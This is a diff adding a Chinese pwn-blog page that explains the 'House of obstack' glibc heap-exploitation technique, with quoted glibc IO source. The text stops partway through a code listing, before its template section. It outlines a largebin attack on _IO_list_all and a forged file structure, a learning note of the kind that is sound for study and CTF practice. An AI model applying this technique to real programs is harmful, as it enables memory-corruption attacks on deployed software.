@@ -1,0 +1,1051 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="参考了 7resp4ss 师傅的文章\nhttps://tttang.com/archive/1845/#toc__io_obstack_overflow\n介绍 范围：2.37之前，因为2.37之后把obstack结构体给删了\n">
+<title>House of obstack</title>
+
+<link rel='canonical' href='http://localhost:1313/p/house-of-obstack/'>
+
+<link rel="stylesheet" href="/scss/style.min.84466b97fc2839f50008967839ac7e52db98eefba6b8d2a771a97db8f36059e7.css"><meta property='og:title' content="House of obstack">
+<meta property='og:description' content="参考了 7resp4ss 师傅的文章\nhttps://tttang.com/archive/1845/#toc__io_obstack_overflow\n介绍 范围：2.37之前，因为2.37之后把obstack结构体给删了\n">
+<meta property='og:url' content='http://localhost:1313/p/house-of-obstack/'>
+<meta property='og:site_name' content='fuguang&#39;s storys'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='pwn' /><meta property='article:tag' content='House系列学习' /><meta property='article:published_time' content='2026-03-17T22:53:28&#43;08:00'/><meta property='article:modified_time' content='2026-03-17T22:53:28&#43;08:00'/><meta property='og:image' content='http://localhost:1313/image/House_of_obstack.jpg' />
+<meta name="twitter:title" content="House of obstack">
+<meta name="twitter:description" content="参考了 7resp4ss 师傅的文章\nhttps://tttang.com/archive/1845/#toc__io_obstack_overflow\n介绍 范围：2.37之前，因为2.37之后把obstack结构体给删了\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/image/House_of_obstack.jpg' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_c17c68125d7ac105.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">fuguang&#39;s storys</a></h1>
+            <h2 class="site-description">Welcome ~</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/fu9-dotom/fu9-dotom.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#介绍">介绍</a></li>
+    <li><a href="#源码分析">源码分析</a>
+      <ol>
+        <li><a href="#obstack结构体如下">obstack结构体如下</a></li>
+        <li><a href="#_io_obstack_file结构体">_IO_obstack_file结构体</a></li>
+        <li><a href="#_io_obstack_jumps">_IO_obstack_jumps</a></li>
+        <li><a href="#_io_obstack_overflow">_IO_obstack_overflow</a></li>
+        <li><a href="#_io_obstack_xsputn">_IO_obstack_xsputn</a></li>
+        <li><a href="#obstack_blank_fastobstack_grow">obstack_blank_fast&amp;&amp;obstack_grow</a></li>
+        <li><a href="#_obstack_newchunk">_obstack_newchunk</a></li>
+        <li><a href="#call_chunkfun">CALL_CHUNKFUN</a></li>
+      </ol>
+    </li>
+    <li><a href="#模板">模板</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/house-of-obstack/">
+                
+                    <img src="/image/House_of_obstack.jpg" loading="lazy" alt="Featured image of post House of obstack" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/pwn/" style="background-color: #2a9d8f; color: #fff;">
+                Pwn
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/house-of-obstack/">House of obstack</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 17, 2026</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>参考了<font style="color:rgb(54, 72, 99);background-color:rgba(255, 255, 255, 0.8);"> </font><a class="link" href="https://tttang.com/archive/1845/#toc__2"  target="_blank" rel="noopener"
+    ><font style="color:rgb(175, 122, 197);">7resp4ss</font></a><font style="color:rgb(54, 72, 99);background-color:rgba(255, 255, 255, 0.8);"> </font><font style="color:rgb(54, 72, 99);background-color:rgba(255, 255, 255, 0.8);">师傅的文章</font></p>
+<p><a class="link" href="https://tttang.com/archive/1845/#toc__io_obstack_overflow"  target="_blank" rel="noopener"
+    >https://tttang.com/archive/1845/#toc__io_obstack_overflow</a></p>
+<h2 id="介绍">介绍
+</h2><p>范围：2.37之前，因为2.37之后把obstack结构体给删了</p>
+<p>条件 ：能够泄露libc和heap，一次largebin attack,能触发IO流</p>
+<p>通过largebin attack劫持_IO_list_all到堆地址，伪造_IO_file触发_IO_obsatck_overflow</p>
+<h2 id="源码分析">源码分析
+</h2><h3 id="obstack结构体如下">obstack结构体如下
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">obstack</span>          <span class="cm">/* control current object in current chunk */</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">chunk_size</span><span class="p">;</span>              <span class="cm">/* preferred size to allocate chunks in */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">_obstack_chunk</span> <span class="o">*</span><span class="n">chunk</span><span class="p">;</span> <span class="cm">/* address of current struct obstack_chunk */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">object_base</span><span class="p">;</span>            <span class="cm">/* address of object we are building */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">next_free</span><span class="p">;</span>              <span class="cm">/* where to add next char to current object */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">chunk_limit</span><span class="p">;</span>            <span class="cm">/* address of char after current chunk */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">union</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">PTR_INT_TYPE</span> <span class="n">tempint</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">void</span> <span class="o">*</span><span class="n">tempptr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">temp</span><span class="p">;</span>                       <span class="cm">/* Temporary for some macros.  */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">alignment_mask</span><span class="p">;</span>           <span class="cm">/* Mask of alignment for each object. */</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* These prototypes vary based on &#39;use_extra_arg&#39;, and we use
+</span></span></span><span class="line"><span class="cl"><span class="cm">     casts to the prototypeless function type in all assignments,
+</span></span></span><span class="line"><span class="cl"><span class="cm">     but having prototypes here quiets -Wstrict-prototypes.  */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">_obstack_chunk</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">chunkfun</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">,</span> <span class="kt">long</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">freefun</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">_obstack_chunk</span> <span class="o">*</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">extra_arg</span><span class="p">;</span>              <span class="cm">/* first arg for chunk alloc/dealloc funcs */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="nl">use_extra_arg</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>     <span class="cm">/* chunk alloc/dealloc funcs take extra arg */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="nl">maybe_empty_object</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span> <span class="cm">/* There is a possibility that the current
+</span></span></span><span class="line"><span class="cl"><span class="cm">                      chunk contains a zero-length object.  This
+</span></span></span><span class="line"><span class="cl"><span class="cm">                      prevents freeing the chunk if we allocate
+</span></span></span><span class="line"><span class="cl"><span class="cm">                      a bigger chunk to replace it. */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="nl">alloc_failed</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>      <span class="cm">/* No longer used, as we now call the failed
+</span></span></span><span class="line"><span class="cl"><span class="cm">                     handler on error, but retained for binary
+</span></span></span><span class="line"><span class="cl"><span class="cm">                     compatibility.  */</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="_io_obstack_file结构体">_IO_obstack_file结构体
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">_IO_obstack_file</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">_IO_FILE_plus</span> <span class="n">file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">obstack</span> <span class="o">*</span><span class="n">obstack</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>就是给_IO_FILE_plus结构图追加了一个obstack结构体类型的指针</p>
+<h3 id="_io_obstack_jumps">_IO_obstack_jumps
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="n">_IO_obstack_jumps</span> <span class="n">libio_vtable</span> <span class="n">attribute_hidden</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="n">_IO_obstack_overflow</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">_IO_obstack_xsputn</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">showmanyc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">imbue</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>该<code>vtable</code>内只存在两个函数，分别为<code>_IO_obstack_overflow</code>、<code>_IO_obstack_xsputn</code></p>
+<h3 id="_io_obstack_overflow">_IO_obstack_overflow
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span>
+</span></span><span class="line"><span class="cl"><span class="nf">_IO_obstack_overflow</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">obstack</span> <span class="o">*</span><span class="n">obstack</span> <span class="o">=</span> <span class="p">((</span><span class="k">struct</span> <span class="n">_IO_obstack_file</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">obstack</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Make room for another character.  This might as well allocate a
+</span></span></span><span class="line"><span class="cl"><span class="cm">     new chunk a memory and moves the old contents over.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">assert</span> <span class="p">(</span><span class="n">c</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">);</span>    <span class="c1">//关注这里
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">obstack_1grow</span> <span class="p">(</span><span class="n">obstack</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Setup the buffer pointers again.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="nf">obstack_base</span> <span class="p">(</span><span class="n">obstack</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="nf">obstack_next_free</span> <span class="p">(</span><span class="n">obstack</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">size</span> <span class="o">=</span> <span class="nf">obstack_room</span> <span class="p">(</span><span class="n">obstack</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">+</span> <span class="n">size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Now allocate the rest of the current chunk.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">obstack_blank_fast</span> <span class="p">(</span><span class="n">obstack</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到，第二个参数要为0，才能正常执行该函数。而_IO_flush_all_lockp进行调用vtable时，rsi往往是0xffffffff,所以我们看另一个函数</p>
+<h3 id="_io_obstack_xsputn">_IO_obstack_xsputn
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">_IO_size_t</span>
+</span></span><span class="line"><span class="cl"><span class="nf">_IO_obstack_xsputn</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">_IO_size_t</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">obstack</span> <span class="o">*</span><span class="n">obstack</span> <span class="o">=</span> <span class="p">((</span><span class="k">struct</span> <span class="n">_IO_obstack_file</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">obstack</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">+</span> <span class="n">n</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="cm">/* We need some more memory.  First shrink the buffer to the
+</span></span></span><span class="line"><span class="cl"><span class="cm">     space we really currently need.  */</span>
